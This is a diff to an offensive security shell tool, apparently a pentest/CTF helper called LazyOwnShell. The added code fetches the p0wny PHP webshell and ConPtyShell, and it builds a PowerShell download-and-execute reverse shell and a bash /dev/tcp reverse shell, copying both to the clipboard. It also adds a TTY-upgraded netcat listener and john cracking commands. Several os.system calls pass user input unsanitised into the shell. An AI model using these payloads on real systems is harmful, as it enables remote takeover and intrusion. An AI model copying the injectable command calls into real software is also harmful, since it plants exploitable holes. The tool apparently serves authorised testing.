@@ -1218,6 +1218,7 @@ class LazyOwnShell(Cmd):
         """Crea una webshell disfrazada de jpg en el directorio sessions/"""
         print("creando la shell disfrazada de jpg")
         os.system("python3 modules/lazycreate_webshell.py")
+        os.system("cd sessions && wget https://github.com/flozz/p0wny-shell/raw/master/shell.php")
         return
     
     def do_createrevshell(self, line):
@@ -1256,8 +1257,16 @@ class LazyOwnShell(Cmd):
 
     def do_createhash(self, line):
         """Crea un archivo hash.txt en el directorio sessions"""
-        print(f"creando archivo sessions/hash.txt con el siguiente contenido {line}")
+        print(f"{GREEN}[*] creando archivo sessions/hash.txt con el siguiente contenido {line}{RESET}")
         os.system(f"echo '{line}' > sessions/hash.txt")
+        print(f"{GREEN}[*] Analisando sessions/hash.txt con Name-the-hash {RESET}")
+        os.system(f"nth -t {line}")
+       
+        return
+
+    def do_download_resources(self, line):
+        """download resources in sessions"""
+        os.system("cd sessions && ./download_resources.sh ")
         return
 
     def do_dirsearch(self, line):
@@ -1283,11 +1292,11 @@ class LazyOwnShell(Cmd):
             print("wordlist must be set use set wordlist <path_to_wordlist>")
             return
         if line:
-            print("sudo john hash.txt --show")
-            os.system("sudo john sessions/hash.txt --show")
+            print(f"sudo john hash.txt {line}")
+            os.system(f"sudo john sessions/hash.txt --wordlist={wordlist} {line}")
         else:
             print("sudo john hash.txt --show")
-            os.system(f"sudo john sessions/hash.txt --wordlist={wordlist}")
+            os.system(f"sudo john sessions/hash.txt --wordlist={wordlist} --show")
         return
 
     def do_hashcat(self, line):
@@ -1351,6 +1360,19 @@ class LazyOwnShell(Cmd):
         print(f"[+] Try ... bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
         os.system(f"echo \"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip")
         return
+    def do_conptyshell(self,line):
+        """Download ConPtyShell in sessions directory and copy to clipboard the command :D """
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        if not lhost or not lport:
+            print(f"{YELLOW} [?] lhost and lport must be set.{RESET}")
+            return
+
+        os.system("cd sessions && wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1")
+        cmd = f"""IEX(IWR http://{lhost}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {lhost} {lport}"""
+        os.system(f"echo '{cmd}' |  xclip -sel clip")
+        print(f"{GREEN}[+]{cmd} {YELLOW} Copied to clipboard :D {RESET}")
+        return
     def do_nc(self,line):
         """run nc -lvnp 6666 :) """
         lport = self.params["lport"]
@@ -1359,10 +1381,10 @@ class LazyOwnShell(Cmd):
             return
         if not line:
             print(f"{GREEN}[+] Try.. nc -lvnp {lport}{RESET}")
-            os.system(f"nc -lvnp {lport}")
+            os.system(f"stty raw -echo; (stty size; cat) | nc -lvnp {lport}")
         else:
             print(f"{GREEN}[+] Try.. nc -lvnp {line}{RESET}")
-            os.system(f"nc -lvnp {line}")
+            os.system(f"stty raw -echo; (stty size; cat) | nc -lvnp {line}")
         return
     def do_sh(self,line):
         """execute some command direct in shell to avoid exit LazyOwn ;)"""
@@ -1473,7 +1495,7 @@ class LazyOwnShell(Cmd):
         return
     def do_clean(self, line):
         """delete all from sessions"""
-        os.system("rm sessions/*.nmap sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* -rf")
+        os.system("rm sessions/*.ps1 sessions/*.exe sessions/*.nmap sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* -rf")
         print(f"{GREEN}[*]{YELLOW} cleanned sessions directory. {RESET}")
         return
 
